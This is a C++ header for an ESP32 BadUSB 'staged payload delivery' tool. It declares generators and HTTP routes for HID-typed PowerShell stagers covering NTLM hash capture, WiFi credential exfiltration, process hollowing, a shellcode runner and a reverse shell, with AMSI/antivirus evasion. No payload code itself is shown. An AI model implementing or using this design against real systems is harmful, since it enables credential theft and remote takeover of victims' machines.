/**
 * @file payload_manager.h
 * @brief Staged Payload Delivery System for BadUSB Attacks
 * 
 * Manages HTTP routes that serve Stage 1+ payloads and provides
 * Stage 0 stager generators for HID injection. Implements a 
 * multi-stage architecture for evasion:
 * 
 * - Stage 0: Tiny stager typed via USB HID (downloads Stage 1)
 * - Stage 1: Full payload downloaded from ESP32 HTTP server
 * - Stage 2+: Additional modules loaded from SD card or network
 * 
 * @note All payloads use PayloadObfuscator for AMSI/AV evasion
 * 
 * @author Monster S3 Team
 * @date 2025
 * @version 2.0
 */

#pragma once

#include <Arduino.h>
#include <ESPAsyncWebServer.h>

/**
 * @class PayloadManager
 * @brief Static class managing payload generation and HTTP delivery
 * 
 * Routes registered:
 * - /p/wax     - WAX file for NTLM hash capture
 * - /p/posh    - PoshC2 framework loader
 * - /p/exfil   - WiFi credential exfiltration
 * - /p/hollow  - Process hollowing shellcode injection
 * - /p/runner  - In-process shellcode runner
 * - /p/revshell - PowerShell reverse shell
 */
class PayloadManager {
public:
    /**
     * @brief Initialize HTTP routes on the web server
     * @param server Pointer to AsyncWebServer instance
     */
    static void begin(AsyncWebServer* server);
    
    // =========================================
    // Stage 0 Generators (Stagers typed via HID)
    // =========================================
    
    /**
     * @brief Generate WAX file stager for NTLM capture
     * @param ip Attacker IP running Responder
     * @return Obfuscated PowerShell one-liner
     */
    static String getWaxPayload(String ip);
    
    /**
     * @brief Generate PoshC2 framework loader stager
     * @param ip ESP32 IP or attacker IP
     * @return Obfuscated PowerShell one-liner
     */
    static String getPoshC2Stager(String ip);
    
    /**
     * @brief Generate WiFi exfiltration stager
     * @param ip ESP32 IP to receive credentials
     * @return Obfuscated PowerShell one-liner
     */
    static String getExfilPayload(String ip);
    
    /**
     * @brief Generate process hollowing stager
     * @param ip ESP32 IP serving /p/hollow
     * @return Obfuscated PowerShell with AMSI bypass
     */
    static String getHollowStager(String ip);
    
    /**
     * @brief Generate reverse shell stager
     * @param ip Attacker IP for callback
     * @param port Listening port (default: 4444)
     * @return Obfuscated PowerShell with AMSI bypass
     */
    static String getRevShellStager(String ip, String port = "4444");
    
private:
    /** @brief Handler for /p/wax route */
    static void _handleWax(AsyncWebServerRequest *request);
    
    /**
     * @brief Generate process hollowing payload (DSViper-inspired)
     * @param shellcode XOR-encrypted shellcode bytes
     * @return Full PowerShell script with P/Invoke
     */
    static String _getProcessHollowPayload(String shellcode);
    
    /**
     * @brief Generate in-process shellcode runner
     * @return Full PowerShell script with VirtualAlloc+CreateThread
     */
    static String _getShellcodeRunnerPayload();
};
